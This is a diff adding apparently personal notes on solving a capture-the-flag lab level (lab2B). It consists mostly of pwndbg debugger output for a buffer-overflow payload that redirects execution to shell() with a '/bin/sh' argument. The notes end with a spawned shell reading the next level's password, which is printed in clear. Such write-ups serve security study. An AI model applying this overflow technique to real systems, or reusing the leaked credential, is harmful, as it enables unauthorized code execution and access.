@@ -1,0 +1,130 @@
+Overflowed @ 27 bytes. Jumped to shell() & loaded "/bin/sh" address 
+on the stack.
+
+
+(WITHOUT "JUNK")
+
+
+pwndbg> r $(python -c 'print "A" * 27 + "\xbd\x86\x04\x08" + "CCCC"')
+0x080486c9 in shell ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+─────────────────────────────────[ REGISTERS ]──────────────────────────────────
+ EAX  0x0
+ EBX  0x0
+ ECX  0x0
+ EDX  0xf7f9b890 (_IO_stdfile_1_lock) ◂— 0x0
+ EDI  0xf7f9a000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1d9d6c
+ ESI  0xf7f9a000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1d9d6c
+ EBP  0xffffd2bc ◂— 'AAAACCCC'
+ ESP  0xffffd2a4 ◂— 0x0
+ EIP  0x80486c9 (shell+12) —▸ 0xfffec2e8 ◂— 0x0
+───────────────────────────────────[ DISASM ]───────────────────────────────────
+   0x80486c3 <shell+6>          mov    eax, dword ptr [ebp + 8]
+   0x80486c6 <shell+9>          mov    dword ptr [esp], eax
+ ► 0x80486c9 <shell+12>         call   system@plt <0x8048590>
+        command: 0x0
+ 
+   0x80486ce <shell+17>         leave  
+   0x80486cf <shell+18>         ret    
+ 
+   0x80486d0 <print_name>       push   ebp
+   0x80486d1 <print_name+1>     mov    ebp, esp
+   0x80486d3 <print_name+3>     sub    esp, 0x28
+   0x80486d6 <print_name+6>     mov    eax, dword ptr [ebp + 8]
+   0x80486d9 <print_name+9>     mov    dword ptr [esp + 4], eax
+   0x80486dd <print_name+13>    lea    eax, [ebp - 0x17]
+───────────────────────────────────[ STACK ]────────────────────────────────────
+00:0000│ esp  0xffffd2a4 ◂— 0x0
+01:0004│      0xffffd2a8 ◂— 0x41414141 ('AAAA')
+... ↓
+07:001c│      0xffffd2c0 ◂— 'CCCC'
+
+
+
+(WITH JUNK)
+
+pwndbg> r $(python -c 'print "A" * 27 + "\xbd\x86\x04\x08" + "JUNK" + "CCCC"')
+0x080486c9 in shell ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+─────────────────────────────────[ REGISTERS ]──────────────────────────────────
+ EAX  0x43434343 ('CCCC')
+ EBX  0x0
+ ECX  0x0
+ EDX  0xf7f9b890 (_IO_stdfile_1_lock) ◂— 0x0
+ EDI  0xf7f9a000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1d9d6c
+ ESI  0xf7f9a000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1d9d6c
+ EBP  0xffffd2bc ◂— 'AAAAJUNKCCCC'
+ ESP  0xffffd2a4 ◂— 0x43434343 ('CCCC')
+ EIP  0x80486c9 (shell+12) —▸ 0xfffec2e8 ◂— 0x0
+───────────────────────────────────[ DISASM ]───────────────────────────────────
+   0x80486c3 <shell+6>          mov    eax, dword ptr [ebp + 8]
+   0x80486c6 <shell+9>          mov    dword ptr [esp], eax
+ ► 0x80486c9 <shell+12>         call   system@plt <0x8048590>
+        command: 0x43434343 ('CCCC')
+ 
+   0x80486ce <shell+17>         leave  
+   0x80486cf <shell+18>         ret    
+ 
+   0x80486d0 <print_name>       push   ebp
+   0x80486d1 <print_name+1>     mov    ebp, esp
+   0x80486d3 <print_name+3>     sub    esp, 0x28
+   0x80486d6 <print_name+6>     mov    eax, dword ptr [ebp + 8]
+   0x80486d9 <print_name+9>     mov    dword ptr [esp + 4], eax
+   0x80486dd <print_name+13>    lea    eax, [ebp - 0x17]
+───────────────────────────────────[ STACK ]────────────────────────────────────
+00:0000│ esp  0xffffd2a4 ◂— 0x43434343 ('CCCC')
+01:0004│      0xffffd2a8 ◂— 0x41414141 ('AAAA')
+... ↓
+07:001c│      0xffffd2c0 ◂— 'JUNKCCCC'
+
+
+
+FLAG
+====
+
+pwndbg> r $(python -c 'print "A" * 27 + "\xbd\x86\x04\x08" + "JUNK" + "\xd0\x87\x04\x08"')
+0x080486c9 in shell ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+─────────────────────────────────[ REGISTERS ]──────────────────────────────────
+ EAX  0x80487d0 ◂— das     /* '/bin/sh' */
+ EBX  0x0
+ ECX  0x0
+ EDX  0xf7f9b890 (_IO_stdfile_1_lock) ◂— 0x0
+ EDI  0xf7f9a000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1d9d6c
+ ESI  0xf7f9a000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1d9d6c
+ EBP  0xffffd2bc ◂— 0x41414141 ('AAAA')
+ ESP  0xffffd2a4 —▸ 0x80487d0 ◂— das     /* '/bin/sh' */
+ EIP  0x80486c9 (shell+12) —▸ 0xfffec2e8 ◂— 0x0
+───────────────────────────────────[ DISASM ]───────────────────────────────────
+   0x80486c3 <shell+6>          mov    eax, dword ptr [ebp + 8]
+   0x80486c6 <shell+9>          mov    dword ptr [esp], eax
+ ► 0x80486c9 <shell+12>         call   system@plt <0x8048590>
+        command: 0x80487d0 ◂— '/bin/sh'
+ 
+   0x80486ce <shell+17>         leave  
+   0x80486cf <shell+18>         ret    
+ 
+   0x80486d0 <print_name>       push   ebp
+   0x80486d1 <print_name+1>     mov    ebp, esp
+   0x80486d3 <print_name+3>     sub    esp, 0x28
+   0x80486d6 <print_name+6>     mov    eax, dword ptr [ebp + 8]
+   0x80486d9 <print_name+9>     mov    dword ptr [esp + 4], eax
+   0x80486dd <print_name+13>    lea    eax, [ebp - 0x17]
+───────────────────────────────────[ STACK ]────────────────────────────────────
+00:0000│ esp  0xffffd2a4 —▸ 0x80487d0 ◂— das     /* '/bin/sh' */
+01:0004│      0xffffd2a8 ◂— 0x41414141 ('AAAA')
+... ↓
+07:001c│      0xffffd2c0 ◂— 0x4b4e554a ('JUNK')
+─────────────────────────────────[ BACKTRACE ]──────────────────────────────────
+ ► f 0  80486c9 shell+12
+   f 1 4b4e554a
+   f 2  80487d0
+   f 3  8048700 main+3
+
+
+lab2B@warzone:/levels/lab02$ ./lab2B $(python -c 'print "A" * 27 + "\xbd\x86\x04\x08" + "JUNK" + "\xd0\x87\x04\x08"')
+Hello AAAAAAAAAAAAAAAAAAAAAAAAAAA��JUNKЇ
+$ cat /home/lab2B/.pass
+cat: /home/lab2B/.pass: Permission denied
+$ cat /home/lab2A/.pass
+i_c4ll_wh4t_i_w4nt_n00b
